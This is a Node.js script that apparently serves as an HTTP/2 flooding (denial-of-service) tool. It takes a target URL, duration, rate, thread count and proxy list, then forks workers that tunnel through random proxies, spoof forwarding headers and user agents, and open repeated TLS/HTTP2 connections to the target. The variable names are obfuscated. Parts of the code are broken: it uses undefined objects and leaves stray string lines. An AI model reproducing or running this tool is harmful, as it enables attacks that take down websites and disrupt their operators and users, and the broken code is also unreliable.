const net = require("net"),
  http2 = require("http2"),
  tls = require("tls"),
  cluster = require("cluster"),
  url = require("url"),
  UserAgent = require("user-agents"),
  fs = require("fs"),
  {
    HeaderGenerator
  } = require("header-generator");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (_0x32d0fa) {});
process.argv.length < 7 && (console.log("<target> <time> <rate> <threads> <proxyfile>"), process.exit());
const headers = {};
function readLines(_0x2a1084) {
  return fs.readFileSync(_0x2a1084, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x10178e, _0x4cb6a6) {
  return Math.floor(Math.random() * (_0x4cb6a6 - _0x10178e) + _0x10178e);
}
function randomElement(_0x5e19fc) {
  return _0x5e19fc[randomIntn(0, _0x5e19fc.length)];
}
const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6]
};
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
class NetSocket {
  constructor() {}
  HTTP(_0x4f14f8, _0x35088c) {
    const _0xb9f9de = "CONNECT " + _0x4f14f8.address + ":443 HTTP/1.1\r\nHost: " + _0x4f14f8.address + ":443\r\nConnection: Keep-Alive\r\n\r\n",
      _0x223f1a = new Buffer.from(_0xb9f9de),
      _0x111246 = net.connect({
        host: _0x4f14f8.host,
        port: _0x4f14f8.port
      });
    _0x111246.setTimeout(_0x4f14f8.timeout * 10000);
    _0x111246.setKeepAlive(true, 60000);
    _0x111246.on("connect", () => {
      _0x111246.write(_0x223f1a);
    });
    _0x111246.on("data", _0x2f49cf => {
      const _0x527484 = _0x2f49cf.toString("utf-8"),
        _0x5ae6f1 = _0x527484.includes("HTTP/1.1 200");
      if (_0x5ae6f1 === false) {
        _0x111246.destroy();
        return _0x35088c(undefined, "error: invalid response from proxy server");
      }
      return _0x35088c(_0x111246, undefined);
    });
    _0x111246.on("timeout", () => {
      _0x111246.destroy();
      return _0x35088c(undefined, "error: timeout exceeded");
    });
    _0x111246.on("error", _0x658ec2 => {
      _0x111246.destroy();
      return _0x35088c(undefined, "error: " + _0x658ec2);
    });
  }
}
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
"ecdsa_secp256r1_sha256";
"ecdsa_brainpoolP256r1tls13_sha256";
"ecdsa_brainpoolP384r1tls13_sha384";
"ecdsa_brainpoolP512r1tls13_sha512";
"ecdsa_sha1";
"ed25519";
"ed448";
"rsa_pkcs1_sha1";
"rsa_pkcs1_sha256";
"rsa_pkcs1_sha384";
"rsa_pss_pss_sha256";
"rsa_pss_pss_sha384";
"rsa_pss_pss_sha512";
"sm2sig_sm3";
"ecdsa_secp384r1_sha384";
"ecdsa_secp521r1_sha512";
"rsa_pss_rsae_sha256";
"rsa_pss_rsae_sha384";
"rsa_pss_rsae_sha512";
"rsa_pkcs1_sha512";
const Header = new NetSocket();
headers[":method"] = "GET";
headers.GET = " / HTTP/2";
headers["Referrer Policy"] = randomHeaders["Referrer Policy"];
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers["Accept-Ranges"] = "bytes";
headers["access-control-allow-origin"] = "*";
headers["Keep-Alive"] = "parameters";
headers.Origin = randomHeaders.Origin;
headers["x-frame-options"] = randomHeaders["x-frame-options"];
headers.accept = randomHeaders.accept;
headers.date = randomHeaders.date;
headers["alt-svc"] = randomHeaders["alt-svc"];
headers["Client-IP"] = parsedProxy[0];
headers["Real-IP"] = parsedProxy[0];
headers.Via = randomHeaders.Via;
headers["accept-ch"] = randomHeaders["accept-ch"];
headers["Strict-Transport-Security"] = randomHeaders["Strict-Transport-Security"];
headers["X-XSS-Protection"] = randomHeaders["X-XSS-Protection"];
headers["x-cache"] = randomHeaders["x-cache"];
headers["accept-language"] = randomHeaders["accept-language"];
headers["accept-encoding"] = randomHeaders["accept-encoding"];
headers.Connection = "keep-alive";
headers["content-type"] = randomHeaders["content-type"];
headers["sec-ch-ua"] = randomHeaders["sec-ch-ua"];
headers["content-length"] = randomHeaders["content-length"];
headers["cache-control"] = randomHeaders["cache-control"];
headers["upgrade-insecure-requests"] = randomHeaders["upgrade-insecure-requests"];
headers["sec-ch-ua-platform"] = randomHeaders["sec-ch-ua-platform"];
headers.TE = "trailers";
headers["Timing-Allow-Origin"] = "*";
headers.server = randomHeaders.server;
headers.Age = randomHeaders.Age;
headers["content-security-policy"] = randomHeaders["content-security-policy"];
headers["cross-origin-opener-policy"] = randomHeaders["cross-origin-opener-policy"];
headers["x-requested-with"] = "XMLHttpRequest";
headers.vary = randomHeaders.vary;
headers["report-to"] = randomHeaders["report-to"];
headers.etag = randomHeaders.etag;
headers["last-modified"] = randomHeaders["last-modified"];
headers["content-encoding"] = randomHeaders["content-encoding"];
headers["sec-fetch-dest"] = randomHeaders["sec-fetch-dest"];
headers["sec-fetch-mode"] = randomHeaders["sec-fetch-mode"];
headers["sec-fetch-site"] = randomHeaders["sec-fetch-site"];
headers.pragma = "no-cache";
headers.cookie = randomHeaders.cookie;
headers["x-content-type-options"] = randomHeaders["x-content-type-options"];
function runFlooder() {
  const _0x3915c4 = randomElement(proxies),
    _0x377feb = _0x3915c4.split(":"),
    _0x191f08 = new UserAgent();
  var _0x32f9d7 = _0x191f08.toString();
  headers[":authority"] = parsedTarget.host;
  headers["x-forwarded-for"] = _0x377feb[0];
  headers["x-forwarded-proto"] = "https";
  headers["user-agent"] = _0x32f9d7;
  const _0x424296 = {
    host: _0x377feb[0],
    port: ~~_0x377feb[1],
    address: parsedTarget.host + ":443",
    timeout: 100
  };
  Header.HTTP(_0x424296, (_0x223bb3, _0x5b5766) => {
    if (_0x5b5766) {
      return;
    }
    _0x223bb3.setKeepAlive(true, 60000);
    const _0x28d3bc = {
        ALPNProtocols: ["h2", "http1.1"],
        followAllRedirects: true,
        challengeToSolve: Infinity,
        clientTimeout: 5000,
        clientlareMaxTimeout: 15000,
        echdCurve: "X25519:P-256:P-384",
        ciphers: tls.getCiphers().join(":") + "ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305|ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]:ECDHE+AES128:RSA+AES128:ECDHE+AES256:RSA+AES256:ECDHE+3DES:RSA+3DES",
        rejectUnauthorized: false,
        socket: _0x223bb3,
        decodeEmails: false,
        honorCipherOrder: true,
        sigalgs: sigalgs,
        requestCert: true,
        servername: url.hostname,
        secure: true,
        port: 443,
        secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method", "TLS_method"],
        uri: parsedTarget.host,
        servername: parsedTarget.host
      },
      _0x15ff1e = tls.connect(443, parsedTarget.host, _0x28d3bc);
    _0x15ff1e.setKeepAlive(true, 600000);
    const _0x1d610d = http2.connect(parsedTarget.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false
      },
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => _0x15ff1e,
      socket: _0x223bb3
    });
    _0x1d610d.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 20000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      enablePush: false
    });
    _0x1d610d.on("connect", () => {});
    _0x1d610d.on("close", () => {
      _0x1d610d.destroy();
      _0x223bb3.destroy();
      return;
    });
    _0x1d610d.on("error", _0x5f4cb0 => {
      _0x1d610d.destroy();
      _0x223bb3.destroy();
      return;
    });
  });
}
const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);
